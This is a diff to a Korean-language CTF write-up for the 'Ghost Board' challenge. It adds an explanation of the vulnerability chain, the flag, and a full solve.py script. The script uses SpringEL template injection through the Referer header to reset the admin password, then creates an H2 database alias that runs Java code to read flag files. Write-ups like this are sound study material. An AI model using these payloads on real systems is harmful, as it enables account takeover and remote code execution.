@@ -73,7 +73,7 @@ Ghost Board는 아래 취약점이 **체인**으로 이어져 플래그 파일(`
 
 `/api/admin/dashboard`가 `Referer` 헤더를 템플릿 렌더링 중 SpringEL로 평가한다.
 
-예) `Referer: ' + ${7*7} + '` 를 주면 화면에 `49`가 노출되어 SSTI가 확인된다.
+ `Referer: ' + ${7*7} + '` 를 주면 화면에 `49`가 노출되어 SSTI가 확인된다.
 
 #### (4) Bean 접근 가능
 
@@ -190,19 +190,116 @@ curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMIN_TOKEN" 
 
 ---
 
+### 4) Why it works
+- **XSS**로 관리자 봇에서 JS가 실행되며 **ADMINJWT**를 탈취한다.
+- 탈취한 토큰으로 `/api/admin/dashboard`에 접근하고, `Referer`가 **템플릿에서 평가(SSTI)** 되어 서버에서 SpringEL이 실행된다.
+- SpringEL에서 Bean(`@jdbcTemplate` 등) 접근이 가능해 DB에 SQL을 실행할 수 있고,
+- H2의 **Java ALIAS** 기능으로 JVM 코드가 실행되어 `/flag-*.txt`를 읽는다.
+
 ## Flag
-
-예시:
-
 ```text
 0xL4ugh{c0ngr47z_y0u_did_wh47_sh4d0w_did_in_bug_b0un7y_cef24d181cf97ee3342cfd5284e0bf57}
 ```
+
+---
+## Notes
+- **Stored XSS → Admin bot → Referer SSTI → Bean 접근 → H2 ALIAS → 파일 읽기**
 
 ---
 
 ## solve.py
 
 ```bash
+#!/usr/bin/env python3
+import argparse
+import json
+import re
+import sys
+import requests
+
+def die(msg: str, code: int = 1):
+    print(f"[!] {msg}", file=sys.stderr)
+    raise SystemExit(code)
+
+def ssti_get(session: requests.Session, target: str, jwt: str, expr: str) -> str:
+    # expr: raw SpringEL expression (without ${})
+    referer = "' + ${" + expr + "} + '"
+    r = session.get(
+        f"{target}/api/admin/dashboard",
+        headers={"Authorization": f"Bearer {jwt}", "Referer": referer},
+        timeout=20,
+    )
+    r.raise_for_status()
+    return r.text
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--target", required=True, help="Base URL, e.g. http://host:port")
+    ap.add_argument("--adminjwt", required=True, help="Admin JWT stolen via XSS (from webhook)")
+    ap.add_argument("--newpass", default="Admin!234567", help="Password to set for admin user")
+    args = ap.parse_args()
+
+    target = args.target.rstrip("/")
+    adminjwt = args.adminjwt.strip()
+    newpass = args.newpass
+
+    s = requests.Session()
+
+    # 1) SSTI sanity check
+    html = ssti_get(s, target, adminjwt, "7*7")
+    if "49" not in html:
+        print("[*] SSTI check did not obviously show 49. Continuing anyway...")
+
+    # 2) Reset admin password via userRepository + passwordEncoder
+    expr_reset = (
+        '{#u=@userRepository.findByUsername("admin").get(), '
+        f'#u.setPassword(@passwordEncoder.encode("{newpass}")), '
+        '@userRepository.save(#u), "OK"}[3]'
+    )
+    _ = ssti_get(s, target, adminjwt, expr_reset)
+    print(f"[+] Requested admin password reset to: {newpass}")
+
+    # 3) Login as admin
+    r = s.post(
+        f"{target}/api/auth/login",
+        headers={"Content-Type": "application/json"},
+        data=json.dumps({"username": "admin", "password": newpass}),
+        timeout=20,
+    )
+    r.raise_for_status()
+    admin_token = r.json().get("token")
+    if not admin_token:
+        die("Failed to obtain admin token after reset")
+    print("[+] Got ADMIN_TOKEN")
+
+    # 4) Create H2 alias GETFLAG2
+    alias_sql = (
+        'CREATE ALIAS IF NOT EXISTS GETFLAG2 AS $$ '
+        'String getflag2() throws Exception { '
+        'try (java.util.stream.Stream<java.nio.file.Path> s = '
+        'java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { '
+        'java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).'
+        'findFirst().orElse(null); '
+        'if (p==null) return "NF"; '
+        'return java.nio.file.Files.readString(p); '
+        '} } $$'
+    )
+    alias_sql_escaped = alias_sql.replace("'", "''")  # for execute('...')
+    expr_alias = f"@jdbcTemplate.execute('{alias_sql_escaped}')"
+    _ = ssti_get(s, target, admin_token, expr_alias)
+    print("[+] Created GETFLAG2 alias")
+
+    # 5) Call alias: SELECT GETFLAG2()
+    expr_call = "@jdbcTemplate.queryForList('SELECT GETFLAG2() AS F')[0].get('F')"
+    html = ssti_get(s, target, admin_token, expr_call)
+
+    m = re.search(r"0xL4ugh\{[^}]+\}", html)
+    if not m:
+        die("Flag pattern not found in response")
+    print("[+] FLAG:", m.group(0))
+
+if __name__ == "__main__":
+    main()
 
 ```
 
